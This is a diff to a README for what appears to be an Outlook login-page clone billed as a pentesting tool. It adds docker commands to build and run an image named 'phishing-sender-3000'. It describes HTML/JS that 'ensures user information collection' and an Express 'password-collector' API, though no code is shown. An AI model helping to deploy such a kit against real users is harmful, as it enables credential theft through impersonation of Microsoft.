@@ -1,5 +1,14 @@
 # Modern Microsoft login page for pentesting.
 
+
+```
+docker buildx build --platform linux/amd64,linux/arm64 -t angjason/phishing-sender-3000:v6 .
+
+docker push angjason/phishing-sender-3000:v5
+
+docker run -d -p 4000:80 angjason/phishing-sender-3000:v6
+```
+
 ###### Good looking html login and a bit of JavaScript ensures user information collection.
 
 Outlook-login-clone includes two versions, HTML&JS-only directory contains just what the dir's name say and in the express-password-collector is powerfull and simple express api writen with TypeScript.
